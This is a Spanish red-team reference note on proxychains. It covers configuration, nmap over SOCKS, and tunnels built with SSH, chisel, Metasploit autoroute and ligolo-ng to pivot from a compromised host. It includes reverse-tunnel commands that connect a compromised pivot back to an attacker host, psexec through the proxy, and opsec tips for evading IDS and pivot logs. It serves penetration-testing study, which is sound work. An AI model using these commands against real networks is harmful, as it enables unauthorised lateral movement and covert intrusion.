---
aliases:
  - proxychains
  - proxychains4
  - proxychains-ng
tags:
  - tool/proxychains
  - technique/lateral-movement
  - technique/evasion
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Post-Explotación]]"
tertiary categories:
  - "[[Pivoting]]"
kind: Tool
linked:
  - "[[Pivoting & Port Forwarding]]"
  - "[[nmap]]"
  - "[[Impacket Toolkit]]"
  - "[[Metasploit Framework]]"
---
# Proxychains

---

## Cheatsheet

| Uso | Comando |
| --- | --- |
| **Basic** | `proxychains4 curl http://internal:8080` |
| **Quiet** | `proxychains4 -q nmap -sT -Pn -p 80 10.10.10.10` |
| **Custom config** | `proxychains4 -f ./mychain.conf cmd` |
| **SOCKS5 listener (metasploit)** | `use auxiliary/server/socks_proxy; run` |
| **SOCKS via SSH** | `ssh -D 1080 user@pivot` |
| **SOCKS via chisel** | `chisel server --reverse -p 443` → `chisel client atk:443 R:socks` |

---

## Concepto

Wrapper que fuerza tráfico TCP de cualquier binario a través de uno o más proxies (SOCKS4/5 o HTTP). Backbone de pivoting red-team: tool local (nmap/curl/impacket) → SOCKS → host comprometido → red interna.

**Nombre binario**: `proxychains4` (Kali default). Algunas distros: `proxychains` o `proxychains-ng`.

## 1. Configuración

Archivo: `/etc/proxychains.conf` o `/etc/proxychains4.conf` (system-wide) / `./proxychains.conf` (cwd, override).

```conf
# Chain type
strict_chain       # todos los proxies en orden (default)
# dynamic_chain    # skip proxies dead
# random_chain     # orden random

# Timeouts
tcp_read_time_out 15000
tcp_connect_time_out 8000

# Evita DNS leaks — resolve DNS via proxy
proxy_dns

# [ProxyList]
[ProxyList]
socks5  127.0.0.1 1080
# socks4  127.0.0.1 9050
# http    127.0.0.1 8080
# socks5  10.10.10.5 1080 user pass
```

### Chain types

| Tipo | Comportamiento |
| --- | --- |
| `strict_chain` | Todos en orden. Si uno muere → fail. |
| `dynamic_chain` | Skip dead proxies. Úsalo con varias SOCKS. |
| `random_chain` | Random N proxies de la lista (`chain_len = N`). |
| `round_robin_chain` | Rota por chain de N. |

Usar `dynamic_chain` en engagements con múltiples pivots para resiliencia.

## 2. Comandos

```bash
# Básico
proxychains4 curl http://internal.target:8080

# Quiet (sin log progress)
proxychains4 -q nmap -sT -Pn -p 22,80,443 10.10.10.10

# Config custom (útil en múltiples targets)
proxychains4 -f ./htb.conf impacket-psexec dom.local/user@10.10.10.10
```

### Límites conocidos

- **Solo TCP** — UDP no funciona vía SOCKS standard (sí con SOCKS5 UDP en algunos casos, pero proxychains no lo maneja bien).
- **No ICMP** — ping falla. Usar `nmap -Pn -sT`.
- **Syscalls raw** — SYN scan (`nmap -sS`) no funciona (requiere raw socket, no TCP connect). Forzar `-sT`.

## 3. Nmap via proxychains

```bash
# Scan TCP connect via SOCKS (requerido)
proxychains4 -q nmap -sT -Pn -n -p 1-1000 10.10.10.5

# Solo con -Pn (host discovery falla via SOCKS)
proxychains4 -q nmap -sT -Pn --top-ports 100 10.10.10.5

# Sin DNS leak (proxy_dns en config + -n local)
proxychains4 -q nmap -sT -Pn -n -p 443 internal.dom.local
```

Muy lento — para scans masivos prefer tool nativo-SOCKS (ligolo-ng + `agent tunnel` permite scans directos sin wrapping).

## 4. Setup de SOCKS

### SSH dynamic forward
```bash
ssh -D 1080 -N user@pivot.target.com
# → SOCKS5 en 127.0.0.1:1080
```

### sshuttle (VPN-like — alternativa mejor para subnets)
```bash
sshuttle -r user@pivot 10.10.10.0/24
# No proxychains — ruta transparente
```

### chisel reverse SOCKS (cuando pivot no tiene SSH entrante)
```bash
# Atacante
chisel server --reverse -p 443

# Pivot comprometido (client)
./chisel client atk.com:443 R:socks
# → SOCKS5 en atk:1080
```

### Metasploit autoroute + socks_proxy
```
meterpreter > run autoroute -s 10.10.10.0/24
msf > use auxiliary/server/socks_proxy
msf > set VERSION 5
msf > set SRVPORT 1080
msf > run
# Luego proxychains contra 127.0.0.1:1080
```

### ligolo-ng (TUN, no proxychains needed)
```bash
# Atacante
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.10.10.0/24 dev ligolo
./proxy -selfcert

# Agent en pivot
./agent -connect atk.com:11601 -ignore-cert
# En proxy: (agent) > start
```

Ligolo-ng es **mejor que proxychains** para subnets — layer 3 nativo, soporta UDP/ICMP.

## 5. Troubleshooting

| Error | Causa / Fix |
| --- | --- |
| `Connection refused` | SOCKS listener no up. Check `ss -tlnp \| grep 1080`. |
| DNS resolves a IP interna local (no target) | Agregar `proxy_dns` en config, usar `-n` en nmap. |
| `Segmentation fault` en tool raro | Binary static-linked — proxychains no puede hookear. Usar ligolo-ng/sshuttle. |
| Muy lento | Latency acumulada N hops + TCP connect scan. Reducir paralelismo, usar top-ports. |
| `No route to host` | Firewall intermedio. Probar via HTTP proxy o pivot distinto. |

## 6. Opsec

- **Logs del pivot**: cada request via SOCKS deja log en auth.log del pivot si es SSH. Preferir SSH cert-based + `UseDNS no`.
- **IDS en red interna**: nmap via proxychains genera MUCHO tráfico desde un solo host (pivot). Ajustar `-T2` o limitar targets.
- **Browser via SOCKS**: `chromium --proxy-server=socks5://127.0.0.1:1080` — útil para portals web internos.

## Alternativas

| Tool | Ventaja sobre proxychains |
| --- | --- |
| **sshuttle** | VPN-like transparente, soporta DNS/UDP sobre TCP. |
| **ligolo-ng** | TUN L3, soporta UDP/ICMP, nmap full features, throughput alto. |
| **chisel SOCKS** | HTTP tunnel — atraviesa proxies/firewalls outbound. |

Proxychains sigue útil como fallback universal y para tools puntuales (impacket/curl/wget).

## Recursos

- [proxychains-ng GitHub](https://github.com/rofl0r/proxychains-ng)
- [ligolo-ng](https://github.com/nicocha30/ligolo-ng)
- [chisel](https://github.com/jpillora/chisel)

---
